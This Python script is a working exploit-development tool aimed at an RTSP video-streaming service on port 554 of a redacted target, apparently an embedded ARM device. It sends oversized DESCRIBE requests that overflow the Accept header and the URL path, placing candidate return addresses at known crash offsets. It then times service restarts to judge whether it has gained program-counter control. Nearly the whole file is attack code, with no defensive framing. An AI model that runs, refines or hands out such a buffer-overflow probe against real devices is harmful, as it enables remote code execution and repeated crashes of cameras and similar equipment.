#!/usr/bin/env python3
"""
rtsp_accept_url_oracle.py — Accept & URL-path PC offset scan.

Fixes from rtsp_overflow_scan.py:
  - None-safe t formatting (oracle can return None on long dead)
  - wait_rtsp(180) between binary-search steps (Accept is a hard crash)
  - Accept threshold known: ~153B past 'application/sdp;'
  - URL path threshold known: 426B; baseline 4.2s (SIGABRT or mapped?)

Part 1: Accept header PC-offset scan
  pad=153..453 step 4, NULL_PC=0x00000000
  Expect: FAST (<4s) at some pad → PC control confirmed

Part 2: URL path oracle (specific addresses at offset 426)
  9 probe addresses:
    0x00000001, 0x00000000, 0xDEADBEEF, 0x41414141,
    0x00008000, 0x00008001, 0x40000000, 0x40000001,
    0xBFFF8000

Run AFTER scale oracle completes. No concurrent RTSP tests.
Usage:
  python3 -u rtsp_accept_url_oracle.py > /tmp/accept_url_out.txt 2>&1
"""

import socket, time, struct, sys

TARGET    = "█████████████"
RTSP_PORT = 554

def rtsp_alive(timeout=5):
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((TARGET, RTSP_PORT))
        s.sendall(b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n")
        d = b""
        try: d = s.recv(256)
        except: pass
        s.close()
        return b"RTSP" in d
    except:
        return False

def wait_rtsp(max_wait=180, label=""):
    t0 = time.time()
    while time.time() - t0 < max_wait:
        if rtsp_alive():
            elapsed = time.time() - t0
            if elapsed > 2:
                print(f"  [✓] RTSP alive ({label}) — waited {elapsed:.0f}s", flush=True)
            return True
        time.sleep(2)
    print(f"  [✗] RTSP not alive after {max_wait}s ({label})", flush=True)
    return False

def oracle(req_bytes, label="", poll_timeout=120):
    if not wait_rtsp(max_wait=180, label="pre"):
        return None
    print(f"  [→] {label}", flush=True)
    t0 = time.time()
    try:
        s = socket.socket(); s.settimeout(8)
        s.connect((TARGET, RTSP_PORT))
        s.sendall(req_bytes)
        try: s.recv(256)
        except: pass
        s.close()
    except: pass

    PROBE = b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq: 99\r\n\r\n"
    deadline = t0 + poll_timeout
    last_print = t0
    while time.time() < deadline:
        time.sleep(0.4)
        if time.time() - last_print >= 10:
            print(f"    T+{time.time()-t0:.0f}s waiting...", flush=True)
            last_print = time.time()
        try:
            s2 = socket.socket(); s2.settimeout(3)
            s2.connect((TARGET, RTSP_PORT))
            s2.sendall(PROBE)
            d = b""
            try: d = s2.recv(256)
            except: pass
            s2.close()
            if b"RTSP" in d:
                elapsed = time.time() - t0
                tag = "FAST" if elapsed < 4 else ("HIT" if elapsed < 70 else "PANIC")
                print(f"  [★] T+{elapsed:.1f}s [{tag}]", flush=True)
                return elapsed
        except: pass
    print(f"  [?] no restart in {poll_timeout}s", flush=True)
    return float(poll_timeout)

def classify(t, poll=120):
    if t is None: return "SKIP"
    if t < 4: return "FAST"
    if t < 70: return "HIT"
    if t < poll: return "PANIC"
    return "DEAD"

def fmt(t):
    if t is None: return "None"
    return f"{t:.1f}s"


# ─── PART 1: Accept header ────────────────────────────────────────────────────

print("=" * 70)
print("PART 1: Accept header PC-offset scan")
print("  Accept threshold = 153B past 'application/sdp;'")
print("  Scan: pad 153..453, step 4, NULL_PC=0x00000000")
print("  FAST (<4s) at some pad = PC control on Accept!")
print("=" * 70)

wait_rtsp(max_wait=180, label="start")

ACCEPT_PREFIX = b"application/sdp;"
NULL_PC  = struct.pack('<I', 0x00000000)
DEAD_PC  = struct.pack('<I', 0xDEADBEEF)
ACCEPT_THRESHOLD = 153

accept_hits = []

# Baseline: all-A at threshold
req_base = (b"DESCRIBE rtsp://" + TARGET.encode() + b":554/live RTSP/1.0\r\n"
            b"CSeq: 1\r\nUser-Agent: Test\r\n"
            b"Accept: " + ACCEPT_PREFIX + b"A" * ACCEPT_THRESHOLD + b"\r\n\r\n")
t_base = oracle(req_base, label=f"Accept baseline {ACCEPT_THRESHOLD}B all-A", poll_timeout=120)
print(f"  baseline={fmt(t_base)} → {classify(t_base, 120)}", flush=True)
wait_rtsp(180, label="after baseline")

# PC offset scan
for pad in range(ACCEPT_THRESHOLD, ACCEPT_THRESHOLD + 300, 4):
    payload = ACCEPT_PREFIX + b"A" * pad + NULL_PC + b"C" * 32
    req = (b"DESCRIBE rtsp://" + TARGET.encode() + b":554/live RTSP/1.0\r\n"
           b"CSeq: 1\r\nUser-Agent: Test\r\n"
           b"Accept: " + payload + b"\r\n\r\n")
    t = oracle(req, label=f"Accept pad={pad} NULL_PC", poll_timeout=120)
    cls = classify(t, 120)
    print(f"  pad={pad:4d}  t={fmt(t)}  {cls}", flush=True)

    if cls == "FAST":
        accept_hits.append(pad)
        print(f"  *** FAST at pad={pad} → PC CONTROL CANDIDATE! ***", flush=True)
        # Also probe DEADBEEF at this pad to confirm code pointer
        payload2 = ACCEPT_PREFIX + b"A" * pad + DEAD_PC + b"C" * 32
        req2 = (b"DESCRIBE rtsp://" + TARGET.encode() + b":554/live RTSP/1.0\r\n"
                b"CSeq: 1\r\nUser-Agent: Test\r\n"
                b"Accept: " + payload2 + b"\r\n\r\n")
        wait_rtsp(180, f"pre DEADBEEF pad={pad}")
        t2 = oracle(req2, label=f"Accept pad={pad} DEADBEEF (confirm)", poll_timeout=120)
        print(f"  DEADBEEF at pad={pad}: {fmt(t2)} → {classify(t2, 120)}", flush=True)
        if classify(t2, 120) == "PANIC":
            print(f"  *** CONFIRMED: pad={pad} is CODE POINTER! DEADBEEF→kernel panic ***", flush=True)

    wait_rtsp(180, label=f"after Accept pad={pad}")


print()
print("=" * 70)
print("Accept PC scan summary:")
if accept_hits:
    for p in accept_hits:
        print(f"  pad={p} → FAST (PC control!)")
else:
    print("  No FAST found — Accept = DATA pointer or NX, no PC control")
print()


# ─── PART 2: URL path oracle ──────────────────────────────────────────────────

print("=" * 70)
print("PART 2: URL path oracle at offset=426")
print("  Baseline was 4.2s (HIT) — was 0x41414141 a mapped address?")
print("  Testing 9 specific PC values to characterize the overflow")
print("=" * 70)

wait_rtsp(180, label="before URL oracle")

URL_OFFSET = 426
url_results = []

ADDRS = [
    (0x41414141, "0xAAAA_all-A (baseline repeat)"),
    (0x00000001, "near_null"),
    (0x00000000, "null"),
    (0xDEADBEEF, "DEADBEEF_kernel_probe"),
    (0x00008000, "ELF_0x8000_ARM"),
    (0x00008001, "ELF_0x8000_Thumb"),
    (0x00010000, "ELF_0x10000_ARM"),
    (0x00010001, "ELF_0x10000_Thumb"),
    (0x40000000, "mmap_base_ARM"),
    (0x40000001, "mmap_base_Thumb"),
    (0xBFFF8000, "near_stack"),
]

for addr, label in ADDRS:
    payload = b"A" * URL_OFFSET + struct.pack('<I', addr) + b"C" * 32
    # URL path overflow: DESCRIBE rtsp://ip:port/<payload>
    req = (b"DESCRIBE rtsp://" + TARGET.encode() + b":554/" + payload + b" RTSP/1.0\r\n"
           b"CSeq: 1\r\nUser-Agent: Test\r\n\r\n")
    t = oracle(req, label=f"URL 0x{addr:08X} ({label})", poll_timeout=120)
    cls = classify(t, 120)
    url_results.append((addr, label, t, cls))
    print(f"  0x{addr:08X}  {label:35s}  {fmt(t)}  {cls}", flush=True)
    if cls == "HIT":
        print(f"    → HIT: code ran before watchdog! (possible mapped+exec region)", flush=True)
    if cls == "PANIC":
        print(f"    → PANIC: kernel panic from userspace addr? Special code path!", flush=True)
    wait_rtsp(180, label=f"after URL 0x{addr:08X}")


print()
print("=" * 70)
print("URL path oracle summary:")
for addr, label, t, cls in url_results:
    print(f"  0x{addr:08X}  {label:35s}  {fmt(t)}  {cls}")

print()
print("=" * 70)
print("DONE.")
